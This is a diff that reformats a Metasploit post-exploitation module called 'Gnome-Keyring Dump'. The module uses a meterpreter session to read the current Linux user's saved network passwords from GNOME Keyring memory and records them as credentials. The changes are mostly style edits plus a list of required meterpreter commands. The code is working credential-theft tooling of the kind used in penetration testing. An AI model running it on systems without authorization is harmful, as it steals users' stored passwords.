@@ -7,18 +7,31 @@ require 'bindata'
 
 class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Gnome-Keyring Dump',
-      'Description'    => %q{
-        Use libgnome-keyring to extract network passwords for the current user.
-        This module does not require root privileges to run.
-      },
-      'Author'        => 'Spencer McIntyre',
-      'License'       => MSF_LICENSE,
-      'Platform'      => [ 'linux' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Gnome-Keyring Dump',
+        'Description' => %q{
+          Use libgnome-keyring to extract network passwords for the current user.
+          This module does not require root privileges to run.
+        },
+        'Author' => 'Spencer McIntyre',
+        'License' => MSF_LICENSE,
+        'Platform' => [ 'linux' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_native_arch
+              stdapi_net_resolve_host
+              stdapi_railgun_api
+              stdapi_railgun_memread
+            ]
+          }
+        }
+      )
+    )
   end
 
   class GList_x64 < BinData::Record
@@ -112,7 +125,7 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  def get_string(address, chunk_size=64, max_size=256)
+  def get_string(address, chunk_size = 64, max_size = 256)
     data = ''
     begin
       data << session.railgun.memread(address + data.length, chunk_size)
@@ -167,6 +180,7 @@ class MetasploitModule < Msf::Post
   def resolve_host(name)
     address = @hostname_cache[name]
     return address unless address.nil?
+
     vprint_status("Resolving hostname: #{name}")
     begin
       address = session.net.resolve.resolve_host(name)[:ip]
@@ -177,12 +191,12 @@ class MetasploitModule < Msf::Post
 
   def resolve_port(service)
     port = {
-      'ftp'   => 21,
-      'http'  => 80,
+      'ftp' => 21,
+      'http' => 80,
       'https' => 443,
-      'sftp'  => 22,
-      'ssh'   => 22,
-      'smb'   => 445
+      'sftp' => 22,
+      'ssh' => 22,
+      'smb' => 445
     }[service]
     port.nil? ? 0 : port
   end
@@ -210,7 +224,7 @@ class MetasploitModule < Msf::Post
     list_anchor = result['results'].unpack(session.native_arch == ARCH_X64 ? 'Q' : 'L')[0]
     fail_with(Failure::NoTarget, 'Did not receive a list of passwords') if list_anchor == 0
 
-    entry = {:next_ptr => list_anchor}
+    entry = { :next_ptr => list_anchor }
     begin
       entry = get_list_entry(entry[:next_ptr])
       pw_data = entry[:data]
@@ -219,8 +233,10 @@ class MetasploitModule < Msf::Post
         value = pw_data[field]
         pw_data[field] = nil
         next if value == 0
+
         value = get_string(value)
         next if value.empty?
+
         pw_data[field] = value
       end
 
@@ -239,6 +255,7 @@ class MetasploitModule < Msf::Post
 
       pw_data[:port] = resolve_port(pw_data[:protocol]) if pw_data[:port] == 0 and !pw_data[:protocol].nil?
       next if pw_data[:port] == 0  # can't report without a valid port
+
       ip_address = resolve_host(pw_data[:server])
       next if ip_address.nil?      # can't report without an ip address
 
@@ -250,7 +267,6 @@ class MetasploitModule < Msf::Post
         username: pw_data[:user],
         password: pw_data[:password]
       )
-
     end while entry[:next_ptr] != list_anchor and entry[:next_ptr] != 0
 
     libgnome_keyring.gnome_keyring_network_password_list_free(list_anchor)
